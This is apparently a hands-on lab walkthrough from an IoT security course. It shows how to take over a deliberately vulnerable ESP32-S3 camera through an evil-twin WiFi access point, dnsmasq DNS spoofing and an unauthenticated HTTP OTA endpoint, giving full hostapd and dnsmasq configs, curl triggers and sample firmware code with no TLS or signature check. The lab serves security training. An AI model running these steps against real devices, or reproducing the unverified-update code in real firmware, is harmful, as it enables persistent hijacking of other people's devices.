# L22: WiFi Rogue OTA

## Goal
Perform man-in-the-middle attack on unencrypted OTA updates to push malicious firmware via rogue WiFi AP.

## Background

**Why this matters**: IoT devices that download firmware over HTTP are vulnerable to MITM attacks. Attackers can create rogue WiFi access points to intercept OTA requests and serve malicious firmware.

**What you're looking for in IoT devices:**
- Firmware updates downloaded over HTTP (unencrypted)
- No certificate validation even when using HTTPS
- No firmware signature verification
- Devices that connect to WiFi networks by SSID alone

**On CoreS3**: The firmware exposes OTA endpoints at `POST /ota` and `POST /ota/update`. The handler fetches firmware from a URL (provided via `url` parameter, or defaulting to `http://update.example.com/firmware.bin`) using plain HTTP with no TLS and no signature verification:

```cpp
void CameraDevice::handleOTA() {
    String url = webServer->arg("url");
    if (url.length() == 0) {
        url = "http://update.example.com/firmware.bin";  // Default - HTTP, no TLS!
    }

    HTTPClient http;
    http.begin(url);  // VULNERABLE: HTTP, no TLS / certificate validation

    DualSerial.println("[OTA] Downloading firmware over HTTP (no TLS)...");
    int httpCode = http.GET();
    // ... downloads and flashes firmware without any signature check ...
}
```

**Attack components:**
- **Rogue AP** (hostapd) - Fake WiFi with same SSID as device's configured network
- **DNS spoofing** (dnsmasq) - Redirect `update.example.com` to attacker's IP
- **HTTP server** (Python/nginx) - Serve malicious firmware at `/firmware.bin`

The ESP32-S3 connects to any AP matching the configured SSID, making evil twin attacks straightforward.

## Lab Walkthrough

### Step 1: Set Up Rogue Access Point

Create an evil twin AP using the SSID the CoreS3 is configured to join. The ESP32-S3 connects to the strongest signal matching the SSID, so proximity or higher TX power forces association through you.

```bash
# Install required tools
sudo apt install hostapd dnsmasq

# Configure hostapd for rogue AP
# Use the SSID the device was configured with (from L00 setup or NVS dump)
sudo tee /etc/hostapd/hostapd.conf << EOF
interface=wlan1
driver=nl80211
ssid=MyNetwork
hw_mode=g
channel=6
auth_algs=1
wpa=0
EOF

# Configure network interface for the rogue AP
sudo ip addr add 192.168.4.1/24 dev wlan1
sudo ip link set wlan1 up

# Start rogue AP
sudo hostapd /etc/hostapd/hostapd.conf

# Expected output:
# wlan1: interface state UNINITIALIZED->ENABLED
# wlan1: AP-ENABLED
# wlan1: STA 24:0a:c4:xx:xx:xx IEEE 802.11: associated
```

When the CoreS3 connects, serial console shows:
```
[WiFi] Connected to MyNetwork
[WiFi] IP address: 192.168.4.2
```

### Step 2: Configure DNS Spoofing

Run `dnsmasq` as DHCP server and DNS resolver, redirecting `update.example.com` to your IP. The device has no DNS pinning, DNSSEC, or certificate validation.

```bash
# Configure dnsmasq for DHCP + DNS spoofing
sudo tee /etc/dnsmasq.d/rogue.conf << EOF
interface=wlan1
dhcp-range=192.168.4.2,192.168.4.20,255.255.255.0,24h
address=/update.example.com/192.168.4.1
log-queries
log-dhcp
EOF

# Start DNS/DHCP server
sudo dnsmasq -C /etc/dnsmasq.d/rogue.conf -d

# Expected output when device connects:
# dnsmasq-dhcp: DHCPDISCOVER(wlan1) 24:0a:c4:xx:xx:xx
# dnsmasq-dhcp: DHCPOFFER(wlan1) 192.168.4.2 24:0a:c4:xx:xx:xx
# dnsmasq-dhcp: DHCPREQUEST(wlan1) 192.168.4.2 24:0a:c4:xx:xx:xx
# dnsmasq-dhcp: DHCPACK(wlan1) 192.168.4.2 24:0a:c4:xx:xx:xx

# When OTA is triggered, you'll see the DNS query:
# dnsmasq: query[A] update.example.com from 192.168.4.2
# dnsmasq: config update.example.com is 192.168.4.1
```

### Step 3: Serve Malicious Firmware

Start an HTTP server serving a firmware binary at `/firmware.bin`. The device accepts any valid ESP32-S3 binary - no signature, hash, or version check.

```bash
# Create a directory for serving firmware
mkdir -p /tmp/ota-server

# Option 1: Serve a patched firmware (from L06 binary patching)
cp firmware_patched.bin /tmp/ota-server/firmware.bin

# Option 2: Serve the original firmware (proof of concept)
cp .pio/build/M5CoreS3/firmware.bin /tmp/ota-server/firmware.bin

# Start HTTP server on port 80
cd /tmp/ota-server
sudo python3 -m http.server 80

# Expected output when firmware is requested:
# Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
# 192.168.4.2 - - [09/Mar/2026 12:00:00] "GET /firmware.bin HTTP/1.1" 200 -
```

### Step 4: Trigger OTA Update

Send a POST to `/ota` with an explicit URL or let DNS spoofing redirect the default URL. The device downloads, flashes, and reboots with no authenticity checks.

```bash
# Option 1: Trigger OTA with explicit URL pointing to your server
curl -X POST "http://192.168.4.2/ota" \
  -d "url=http://192.168.4.1/firmware.bin"

# Option 2: Trigger OTA with default URL (relies on DNS spoofing)
curl -X POST "http://192.168.4.2/ota"
# Device fetches http://update.example.com/firmware.bin
# DNS spoofing resolves this to 192.168.4.1 (your server)

# Expected JSON response:
# {
#   "status": "accepted",
#   "message": "OTA update started",
#   "warning": "No signature verification!",
#   "url": "http://192.168.4.1/firmware.bin"
# }
```

**Serial console output during OTA:**
```
[OTA] Update requested: http://192.168.4.1/firmware.bin
[OTA] No signature verification configured - accepting arbitrary firmware.
[OTA] Downloading firmware over HTTP (no TLS)...
[OTA] Firmware size: 1843200 bytes
[OTA] Installing firmware...
[OTA] Update complete, rebooting...
```

### Step 5: Verify the Attack

After reboot, confirm your firmware is running by checking version, boot logs, or any modifications you added.

```bash
# Connect to serial console to see boot output
pio device monitor -b 115200

# Watch for boot messages from your modified firmware
# ESP-ROM:esp32s3-20210327
# ...
# CoreS3 IoT Camera Device
# Firmware: <your modified version string>

# Check firmware version via web API (if still accessible)
curl http://192.168.4.1/status

# Expected output (version reflects your firmware):
# {"firmware":"1.0.0-backdoored","uptime":5,...}
```

## Impact

- **Complete device takeover**: Attacker replaces the entire firmware, gaining full control of camera, WiFi, BLE, GPIO, and all peripherals
- **No signature verification**: Any valid ESP32-S3 binary is accepted
- **No TLS on firmware download**: Interception is trivial on any shared network
- **Persistent compromise**: Malicious firmware survives reboots until manually reflashed
- **Supply chain implications**: Compromised OTA domain or DNS spoofing at scale enables mass exploitation
- **No rollback protection**: No version check or anti-rollback mechanism, allowing downgrade attacks

## References

- [Evil Twin Attack - WiFi Professionals](https://www.wifi-professionals.com/2019/01/evil-twin-attack)
- [ESP32-S3 OTA Updates Documentation](https://docs.espressif.com/projects/esp-idf/en/latest/esp32s3/api-reference/system/ota.html)
- [OWASP Firmware Security Testing Methodology](https://owasp.org/www-project-firmware-security-testing-methodology/)
- [CWE-494: Download of Code Without Integrity Check](https://cwe.mitre.org/data/definitions/494.html)
- [CWE-295: Improper Certificate Validation](https://cwe.mitre.org/data/definitions/295.html)
- [ESP32-S3 Technical Reference Manual](https://www.espressif.com/sites/default/files/documentation/esp32-s3_technical_reference_manual_en.pdf)
